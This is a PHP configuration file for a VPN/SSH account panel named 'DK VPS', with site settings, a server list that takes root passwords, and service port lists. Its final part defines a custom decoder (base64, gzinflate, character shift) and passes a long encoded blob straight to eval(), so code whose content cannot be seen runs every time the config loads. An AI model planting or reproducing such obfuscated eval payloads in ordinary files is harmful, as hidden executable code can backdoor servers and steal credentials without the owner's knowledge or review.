<?php
/* Site Data */
$site_name        = "DK VPS";
$site_description = "Premium VPN/SSH/SSL Accounts Fast And Reliable Servers";
$site_template    = "flatly"; // (flatly, darkly, sketchy, lumen, materia)
$site_ip_address = "serverip"; // set site ip
$site_paypal = "https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=5MSCPA9T748GL"; // set site paypal donate link
$site_contact = "https://m.facebook.com/joash.singh.90"; // set site contact us link
$daily_limit_user = "90"; // set daily limit


/* Server Data */
/* Format: Server_Name, IP_Address, Root_Pass, Account_Validity */
/* Example: 1=>array(1=>"DopeKid Server 1","123.456.789","DopeKid","5"), */

$server_lists_array=array(
			1=>array(1=>"servername","serverip","serverpass","5"),
	);			


/* Service Variables */
$port_ssh= '22, 143, 90'; 		                // SSH Ports
$port_dropbear= '80, 109, 110, 442'; 	       	// Dropbear Ports
$port_ssl= '444';                               // SSL Ports
$port_squid= '3128, 8080, 8000, 3128'; 	       	// Squid Ports
$ovpn_client= ''.$hosts.'/Dopekid.ovpn';        // OpenVPN Client Config

function YQfNWK($DqxHt)
{ 
$DqxHt=gzinflate(base64_decode($DqxHt));
 for($i=0;$i<strlen($DqxHt);$i++)
 {
$DqxHt[$i] = chr(ord($DqxHt[$i])-1);
 }
 return $DqxHt;
 }eval(YQfNWK("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"));?>
